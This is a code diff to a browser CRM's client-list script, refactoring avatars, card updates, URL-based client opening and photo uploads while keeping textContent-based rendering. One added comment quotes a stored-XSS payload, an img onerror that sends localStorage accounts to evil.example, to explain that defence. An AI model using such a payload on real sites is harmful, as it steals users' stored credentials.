@@ -47,11 +47,37 @@ let editingClientId = null;
 /**
  * Build one client card.
  *
- * Everything is created with createElement and filled with textContent, never
- * by assembling an HTML string. Client names and companies come from the API
- * and from what the user types, and textContent makes the browser treat them
- * as text to display rather than markup to run. A client called
- * <img src=x onerror=...> shows up as those literal characters.
+ * ======================================================================
+ * SECURITY DECISION 3 — createElement + textContent, never HTML strings
+ * Explained in full in SECURITY.md, section 3.
+ * ======================================================================
+ *
+ * This is the one defence in this app that is REAL security rather than a
+ * compromise forced by having no backend, so it is the one worth understanding
+ * properly.
+ *
+ * Client names, companies and notes are free text. Suppose someone saves a
+ * client called:
+ *
+ *     <img src=x onerror="fetch('https://evil.example/?d='+localStorage.crm_users)">
+ *
+ * If this function built its markup by pasting that into a string —
+ *
+ *     card.innerHTML = '<div>' + client.name + '</div>';      // NEVER
+ *
+ * — the browser would not see a name. It would see an <img> tag, fail to load
+ * "x", run the onerror handler, and post every stored account (including the
+ * readable passwords from decision 1) to someone else's server. And because
+ * the client list is SAVED, it would do that again on every future visit, and
+ * to anyone else who opened that record. That is stored XSS, and persistence
+ * is exactly what makes it the worst kind.
+ *
+ * textContent has no parsing step. It tells the browser "these are characters
+ * to display", so there is nothing to inject into: the payload above renders
+ * as those literal characters, visibly and harmlessly.
+ *
+ * There is no innerHTML anywhere in this project, and that is checked rather
+ * than assumed.
  */
 function createClientCard(client) {
   const card = document.createElement('article');
@@ -61,19 +87,12 @@ function createClientCard(client) {
      would let the DOM hold a stale copy after an edit. */
   card.dataset.id = client.id;
 
-  /* --- Avatar: the API image, or generated initials as a fallback --- */
-  let avatar;
-  if (client.image) {
-    avatar = document.createElement('img');
-    avatar.className = 'avatar';
-    avatar.src = client.image;
-    avatar.alt = '';           // decorative: the name is right next to it
-    avatar.loading = 'lazy';
-  } else {
-    avatar = document.createElement('div');
-    avatar.className = 'avatar avatar--initials';
-    avatar.textContent = getInitials(client.name);
-  }
+  /* --- Avatar ---
+     An uploaded photo wins over the one the API supplied, and initials are
+     the fallback when there is neither. createAvatar() in ui.js owns that
+     rule so the card, the detail window and the profile page cannot end up
+     disagreeing about it. */
+  const avatar = createAvatar(client.avatar || client.image, client.name);
 
   /* --- Name, company, email --- */
   const body = document.createElement('div');
@@ -166,16 +185,50 @@ function createStatusBadge(status) {
  * times.
  */
 function renderClients(list) {
-  listEl.replaceChildren();          // clear whatever was there
-
   if (list.length === 0) {
-    listEl.append(createStateBlock('No clients found.'));
+    listEl.replaceChildren(createStateBlock('No clients found.'));
     return;
   }
 
   const fragment = document.createDocumentFragment();
   list.forEach((client) => fragment.append(createClientCard(client)));
-  listEl.append(fragment);
+
+  /* One call, not "empty it, then fill it". The two-step version left the list
+     with no children in between, so the page briefly had nothing in it. */
+  listEl.replaceChildren(fragment);
+}
+
+/**
+ * Replace exactly one card, leaving the rest of the list untouched.
+ *
+ * Rebuilding all thirty cards to show one changed badge is what made the page
+ * jump to the top: every card the browser was holding the scroll position
+ * against was destroyed and replaced with a new node, and the <select> the
+ * user had just used went with them, so focus fell back to the top of the
+ * document. Swapping the single card that actually changed leaves every other
+ * node exactly where it was, and there is nothing for the scroll position to
+ * be measured against that has moved.
+ *
+ * Only safe when the list's membership and order have not changed — the caller
+ * checks that.
+ */
+function replaceCard(client) {
+  /* Number() rather than the raw value: this is built into a selector, and a
+     client id is always a number. */
+  const old = listEl.querySelector(`.client-card[data-id="${Number(client.id)}"]`);
+  if (!old) { refresh(); return; }
+
+  const hadFocus = old.contains(document.activeElement);
+  const fresh = createClientCard(client);
+  old.replaceWith(fresh);
+
+  /* The dropdown the user was using was destroyed along with the old card, so
+     put focus on its replacement. preventScroll because the card has not
+     moved — the browser scrolling to "reveal" it is the exact jump this
+     function exists to stop. */
+  if (hadFocus) {
+    fresh.querySelector('[data-action="status"]')?.focus({ preventScroll: true });
+  }
 }
 
 /**
@@ -224,6 +277,52 @@ function createStateBlock(message, { error = false, extra = null, spinner = fals
  * act on instead of an empty screen and an error in a console they will never
  * open. The Retry button simply calls this function again.
  */
+/**
+ * Open one client's details straight from the address bar.
+ *
+ * RONIN's advice ends in a button that says "Open Emily Johnson", and this is
+ * what makes that button land somewhere useful instead of just on the list.
+ * The URL carries the id — clients.html?client=12 — and this reads it once the
+ * list has loaded.
+ *
+ * WHY THE URL AND NOT A SHARED VARIABLE. The assistant is navigating between
+ * two separate HTML pages, and a page navigation throws away every variable
+ * the old page had. The only things that survive are storage and the URL, and
+ * a transient "which client did you want" is not something to write to
+ * storage. It also means the link is a real link: it can be bookmarked, opened
+ * in a new tab, or pasted to a colleague.
+ *
+ * ======================================================================
+ * SECURITY DECISION 6 — a URL parameter is untrusted input
+ * Explained in full in SECURITY.md, section 6.
+ * ======================================================================
+ *
+ * Anyone can type anything after `client=`, so this value deserves exactly the
+ * suspicion a form field gets. It is never used to build markup and never
+ * dropped into a selector: it is converted to a number and matched against ids
+ * the app already holds. An id that does not exist simply does nothing, which
+ * is also the right behaviour for an ordinary stale bookmark.
+ *
+ * Compare replaceCard() above, where an id IS interpolated into a selector.
+ * That is safe only because of the Number() wrapped around it, which can
+ * produce nothing but a numeric literal, NaN or Infinity — none of which can
+ * break out of an attribute selector. Without it, an id containing a quote
+ * could change which elements matched. Same shape as SQL injection, same fix:
+ * never build a query out of raw input.
+ */
+function openClientFromUrl() {
+  const wanted = new URLSearchParams(window.location.search).get('client');
+  if (!wanted) return;
+
+  const id = Number(wanted);
+  if (!Number.isFinite(id)) return;
+
+  const client = clients.find((item) => item.id === id);
+  if (!client) return;
+
+  openDetail(id);
+}
+
 async function initClients() {
   listEl.replaceChildren(
     createStateBlock('Loading clients...', { spinner: true })
@@ -232,6 +331,7 @@ async function initClients() {
   try {
     clients = await loadClients();
     refresh();
+    openClientFromUrl();
   } catch (error) {
     console.error('Could not load clients.', error);
 
@@ -403,7 +503,11 @@ async function handleAddClient(event) {
     status: values.status,
     dealValue: Number(values.dealValue),
     notes: [],
+    /* The real clock. Only the thirty starter records get invented history;
+       anything you create yourself is stamped with the actual time, so your
+       genuine activity stays separated from the demo data. */
     createdAt: new Date().toISOString(),
+    closedAt: isClosedStatus(values.status) ? new Date().toISOString() : '',
   };
 
   /* Disable the button while the request is in flight, so an impatient double
@@ -509,18 +613,37 @@ async function handleDeleteClient(id) {
  * Move a client to a different stage.
  *
  * The three-step cycle the whole app runs on: change the state, save it,
- * redraw. Going through refresh() rather than renderClients matters here —
- * if the user is filtering by "Lead" and moves someone to "Won", that client
- * should disappear from the list, which only happens if the filter is
- * reapplied.
+ * redraw. What gets redrawn depends on whether the client is still on screen
+ * afterwards:
+ *
+ *   still visible -> swap that one card, so the page does not move
+ *   filtered out  -> full refresh, because the list really has changed
+ *
+ * The second case is the one that matters for correctness: if the user is
+ * filtering by "Lead" and moves someone to "Won", that client has to disappear
+ * from the list, which only happens if the filter is reapplied. The first case
+ * is the one that matters for the person using it. Note that none of the three
+ * sort orders — newest, name, value — depends on status, so a status change
+ * can never reorder the list; it can only add or remove someone from it. That
+ * is what makes the one-card swap safe.
  */
 function handleStatusChange(id, newStatus) {
   const client = clients.find((item) => item.id === id);
   if (!client) return;
 
   client.status = newStatus;
+
+  /* Record when a deal actually finished, so the analytics page can measure
+     how long deals take rather than guess. Moving a client back out of Won or
+     Lost clears it again — a deal that has reopened has no closing date, and
+     leaving a stale one would quietly corrupt every velocity figure. */
+  client.closedAt = isClosedStatus(newStatus) ? new Date().toISOString() : '';
+
   saveClients(clients);
-  refresh();
+
+  const stillVisible = getVisibleClients(clients, view).some((item) => item.id === id);
+  if (stillVisible) replaceCard(client);
+  else refresh();
 
   showToast(`${client.name} moved to ${newStatus}`, 'success');
 }
@@ -597,21 +720,14 @@ function openDetail(id) {
 
   openClientId = id;
 
-  /* Avatar: the API image if there is one, initials if not. */
-  const avatarSlot = document.getElementById('detail-avatar');
-  avatarSlot.replaceChildren();
-  if (client.image) {
-    const img = document.createElement('img');
-    img.className = 'avatar avatar--lg';
-    img.src = client.image;
-    img.alt = '';
-    avatarSlot.append(img);
-  } else {
-    const initials = document.createElement('div');
-    initials.className = 'avatar avatar--initials avatar--lg';
-    initials.textContent = getInitials(client.name);
-    avatarSlot.append(initials);
-  }
+  /* Uploaded photo, else the API image, else initials. */
+  document.getElementById('detail-avatar')
+    .replaceChildren(createAvatar(client.avatar || client.image, client.name, 'avatar--lg'));
+
+  /* Remove is only offered for a photo this user actually uploaded. The
+     API's own image is not theirs to delete. */
+  document.getElementById('client-avatar-remove').hidden = !client.avatar;
+  document.querySelector('[data-error-for="client-avatar-input"]').textContent = '';
 
   /* textContent throughout — this window shows the same untrusted names and
      companies the cards do. */
@@ -685,10 +801,23 @@ function handleAddNote(event) {
   const client = clients.find((item) => item.id === openClientId);
   if (!client) return;
 
+  const now = new Date();
+
   client.notes.push({
     text,
     /* toLocaleString gives date and time in the reader's own format. */
-    date: new Date().toLocaleString(),
+    date: now.toLocaleString(),
+    /*
+      The same instant again, in ISO form.
+
+      `date` is a display string in whatever format the reader's locale uses,
+      so 05/07/2026 means the fifth of July to one person and the seventh of
+      May to another. That is fine to show and impossible to compute with.
+      The analytics page needs to answer "when did anyone last touch this
+      client", and it cannot do that from a string whose meaning depends on
+      who is looking at it. One is for reading, one is for arithmetic.
+    */
+    at: now.toISOString(),
   });
 
   saveClients(clients);
@@ -802,6 +931,67 @@ function setUpDetailEvents() {
 
   document.getElementById('note-form').addEventListener('submit', handleAddNote);
   document.getElementById('remind-btn').addEventListener('click', handleRemind);
+
+  document.getElementById('client-avatar-input')
+    .addEventListener('change', handleClientAvatarChange);
+  document.getElementById('client-avatar-remove')
+    .addEventListener('click', handleClientAvatarRemove);
+}
+
+/**
+ * Attach an uploaded photo to the open client.
+ *
+ * Stored on the client record itself, inside the existing crm_clients key —
+ * no new storage key, so the four the assignment specifies stay exactly four.
+ *
+ * The image is cropped and re-encoded to 128x128 by readImageAsAvatar() before
+ * it is ever written, which is what makes storing one per client affordable:
+ * about 6KB each, so thirty of them is well under a tenth of the budget.
+ */
+async function handleClientAvatarChange(event) {
+  const input = event.target;
+  const file = input.files[0];
+  const errorSlot = document.querySelector('[data-error-for="client-avatar-input"]');
+
+  errorSlot.textContent = '';
+  if (!file || openClientId === null) return;
+
+  try {
+    const dataUrl = await readImageAsAvatar(file);
+    const client = clients.find((item) => item.id === openClientId);
+    if (!client) return;
+
+    client.avatar = dataUrl;
+
+    /* saveClients() reports a failed write rather than throwing. The realistic
+       cause is a full quota, and a photo that silently fails to save is far
+       more confusing than one that says so. */
+    if (!saveClients(clients)) {
+      client.avatar = '';
+      errorSlot.textContent = 'Not enough browser storage left to save that photo';
+      return;
+    }
+
+    openDetail(openClientId);   // redraw the window with the new photo
+    refresh();                  // and the card behind it
+    showToast('Photo updated ✓', 'success');
+  } catch (error) {
+    errorSlot.textContent = error.message;
+  } finally {
+    /* Reset so picking the same file twice still fires a change event. */
+    input.value = '';
+  }
+}
+
+function handleClientAvatarRemove() {
+  const client = clients.find((item) => item.id === openClientId);
+  if (!client) return;
+
+  client.avatar = '';
+  saveClients(clients);
+  openDetail(openClientId);
+  refresh();
+  showToast('Photo removed', 'info');
 }
 
 /**
@@ -830,13 +1020,11 @@ function closeShortcuts() {
   shortcutsEl.hidden = true;
 }
 
-/** True when the user is typing, so shortcuts must not steal the keystroke. */
-function isTyping(target) {
-  return target.tagName === 'INPUT'
-      || target.tagName === 'TEXTAREA'
-      || target.tagName === 'SELECT'
-      || target.isContentEditable;
-}
+/* isTyping() now lives in app.js. Two separate features needed it — these
+   shortcuts and the Konami easter egg — and once the easter egg moved to
+   app.js so it would work on every page, keeping a second copy here would
+   have been exactly the duplication P5.6 forbids. app.js loads before this
+   file, so the function is already defined by the time anything calls it. */
 
 /** True when any window is open — shortcuts should not fire behind a dialog. */
 function aModalIsOpen() {
@@ -893,44 +1081,11 @@ function setUpShortcuts() {
   });
 }
 
-/**
- * The Konami code easter egg: up up down down left right left right B A.
- *
- * Entering it switches on CRT MODE, turning the faint background scanlines
- * into a full phosphor monitor with flicker and glow.
- *
- * How it works: every key press is appended to a list, the list is trimmed to
- * the length of the code, and the two are compared. Trimming as we go means
- * there is no reset logic and no index to keep in step — the list simply holds
- * the last ten keys at all times.
- */
-const KONAMI_CODE = [
-  'ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown',
-  'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight',
-  'b', 'a',
-];
-
-function setUpEasterEgg() {
-  let pressed = [];
-
-  document.addEventListener('keydown', (event) => {
-    if (isTyping(event.target)) return;
-
-    /* Arrow keys keep their capitals; letters are lowercased so Shift or caps
-       lock does not break the sequence. */
-    const key = event.key.length === 1 ? event.key.toLowerCase() : event.key;
-
-    pressed.push(key);
-    pressed = pressed.slice(-KONAMI_CODE.length);
-
-    if (pressed.join(',') !== KONAMI_CODE.join(',')) return;
-
-    document.body.classList.toggle('crt-mode');
-    const on = document.body.classList.contains('crt-mode');
-    showToast(on ? 'CRT MODE ENGAGED' : 'CRT MODE OFF', 'info');
-    pressed = [];
-  });
-}
+/* The Konami easter egg used to be defined here, which was a mistake: it was
+   only ever wired up on this one page, so entering the code anywhere else in
+   the app did nothing and it looked broken. It now lives in app.js alongside
+   the guard, the theme and the navigation — the other three things that have
+   to behave identically on every page. */
 
 /*
   Do nothing at all if the auth guard is already redirecting.
@@ -951,6 +1106,5 @@ if (!isRedirecting) {
   setUpToolbarEvents();
   setUpEscapeKey();
   setUpShortcuts();
-  setUpEasterEgg();
   initClients();
 }
